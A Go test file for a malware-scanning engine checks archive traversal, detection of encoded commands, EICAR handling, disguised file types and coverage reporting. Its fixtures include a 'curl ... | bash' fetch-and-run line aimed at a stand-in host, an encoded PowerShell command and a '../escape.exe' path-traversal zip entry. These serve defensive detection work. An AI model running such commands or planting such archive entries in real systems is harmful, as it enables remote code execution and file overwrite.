package engine

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestEveryExtensionBaselineCoverage(t *testing.T) {
	paths := []string{"KeyboardLock.cs", "keyboard_lock_core.py", "keyboard_lock_linux.py", "keyboard_lock_macos.py", "launch.sh", "setup.sh", "tests/test_keyboard_lock.py", ".gitattributes", ".gitignore", "LICENSE", "README.md", "docs/social-preview.png"}
	root := t.TempDir()
	for _, name := range paths {
		p := filepath.Join(root, name)
		if err := os.MkdirAll(filepath.Dir(p), 0700); err != nil {
			t.Fatal(err)
		}
		data := []byte("A benign test sample\n")
		if strings.HasSuffix(name, ".png") {
			data = []byte{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n', 0, 0, 0, 0, 'I', 'E', 'N', 'D', 0, 0, 0, 0}
		}
		if err := os.WriteFile(p, data, 0600); err != nil {
			t.Fatal(err)
		}
	}
	report, err := ScanDir(root)
	if err != nil {
		t.Fatal(err)
	}
	if report.FilesSeen != 12 || report.FilesScanned != 12 || report.FilesSkipped != 0 || report.FilesPartial != 0 {
		t.Fatalf("expected full 12/12 coverage; report: %d/%d skipped=%d partial=%d", report.FilesScanned, report.FilesSeen, report.FilesSkipped, report.FilesPartial)
	}
	for _, c := range report.Coverage {
		if c.SHA256 == "" || c.HashScope != "full" || c.Type == "unknown" || c.Status != "complete" {
			t.Fatalf("coverage record incomplete: %+v", c)
		}
	}
}
func TestNestedZipAndArchiveTraversal(t *testing.T) {
	var b bytes.Buffer
	w := zip.NewWriter(&b)
	good, _ := w.Create("safe/payload.ps1")
	good.Write([]byte("powershell -EncodedCommand AAABBB\n"))
	bad, _ := w.Create("../escape.exe")
	bad.Write([]byte("MZtesting"))
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	r := NewReport("nested", "test")
	ScanBytes(r, "samples.zip", b.Bytes())
	Finalize(r)
	if r.FilesScanned != 1 || r.EmbeddedSeen != 2 || r.EmbeddedScanned != 1 || r.EmbeddedUninspected != 1 {
		t.Fatalf("archive tracking: %+v", r)
	}
	found := false
	for _, f := range r.Findings {
		if f.RuleID == "EXEC005" {
			found = true
		}
	}
	if !found {
		t.Fatal("encoded command in nested archive was not detected")
	}
}
func TestGzipTarInspect(t *testing.T) {
	var inner bytes.Buffer
	tw := tar.NewWriter(&inner)
	payload := []byte("curl https://example.test/file | bash\n")
	if e := tw.WriteHeader(&tar.Header{Name: "test.sh", Mode: 0600, Size: int64(len(payload))}); e != nil {
		t.Fatal(e)
	}
	tw.Write(payload)
	tw.Close()
	var outer bytes.Buffer
	gz := gzip.NewWriter(&outer)
	gz.Write(inner.Bytes())
	gz.Close()
	r := NewReport("test", "test")
	ScanBytes(r, "src.tar.gz", outer.Bytes())
	Finalize(r)
	if r.EmbeddedSeen < 1 || r.EmbeddedScanned < 1 || len(r.Findings) == 0 {
		t.Fatalf("nested TAR/GZIP inspection incomplete: %+v", r)
	}
}
func TestOversizedFileIsPartialNotSilentSkip(t *testing.T) {
	// Binary-looking test avoids repeated huge regex work.
	b := make([]byte, MaxFileBytes+16)
	b[0] = 0x00
	r := NewReport("test", "test")
	ScanBytes(r, "large.data", b)
	Finalize(r)
	if r.FilesSeen != 1 || r.FilesScanned != 1 || r.FilesPartial != 1 || r.FilesSkipped != 0 || r.Coverage[0].HashScope != "prefix-only" || r.Verdict != "INCOMPLETE ANALYSIS" {
		t.Fatalf("large file was not visibly partial: %+v", r.Coverage)
	}
}
func TestEicarDetectionDoesNotClaimRealMalware(t *testing.T) {
	r := NewReport("test", "test")
	ScanBytes(r, "unknown.blob", []byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"))
	Finalize(r)
	found := false
	for _, f := range r.Findings {
		if f.RuleID == "TEST001" && strings.Contains(f.Detail, "Harmless") {
			found = true
		}
	}
	if !found {
		t.Fatal("expected EICAR test signature")
	}
}
func TestDisguisedFileAndReport(t *testing.T) {
	r := NewReport("test", "test")
	ScanBytes(r, "screenshot.png", []byte("MZfake PE header"))
	Finalize(r)
	found := false
	for _, f := range r.Findings {
		if f.RuleID == "FILE001" {
			found = true
		}
	}
	if !found {
		t.Fatal("expected content mismatch detection")
	}
	b, err := ReportJSON(r)
	if err != nil {
		t.Fatal(err)
	}
	var decoded Report
	if err = json.Unmarshal(b, &decoded); err != nil {
		t.Fatal(err)
	}
	if decoded.Coverage[0].Type != "pe" {
		t.Fatal("missing detected type")
	}
}
func TestSymlinksRecorded(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "file")
	os.WriteFile(p, []byte("ok"), 0600)
	if err := os.Symlink(p, filepath.Join(dir, "link")); err != nil {
		t.Skip(err)
	}
	r, e := ScanDir(dir)
	if e != nil {
		t.Fatal(e)
	}
	if r.FilesSeen != 2 || r.FilesSkipped != 1 || !r.Truncated {
		t.Fatalf("symlink was silently ignored: %+v", r)
	}
}
func TestRuleCount(t *testing.T) {
	if RulesCount() != 95 {
		t.Fatalf("advertised 95 regex heuristic rules, got %d", RulesCount())
	}
	categories := map[string]bool{}
	seen := map[string]bool{}
	for _, rule := range rules {
		if seen[rule.ID] { t.Fatalf("duplicate detection rule ID: %s", rule.ID) }
		seen[rule.ID] = true
		categories[rule.Category] = true
	}
	// Four additional built-in detector categories are implemented in engine.go;
	// they are not part of the 95 regex rules.
	for _, name := range []string{"File integrity", "Embedded payload", "Document threats", "Test signatures"} {
		categories[name] = true
	}
	if len(categories) != 12 {
		t.Fatalf("expected 12 categories across regex and built-in detectors, got %d: %v", len(categories), categories)
	}
}
